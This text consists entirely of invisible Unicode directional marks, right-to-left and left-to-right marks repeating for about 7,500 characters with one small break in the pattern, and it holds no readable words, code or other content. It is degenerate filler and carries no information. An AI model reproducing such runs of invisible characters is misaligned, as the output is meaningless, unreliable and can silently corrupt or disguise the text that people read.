‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏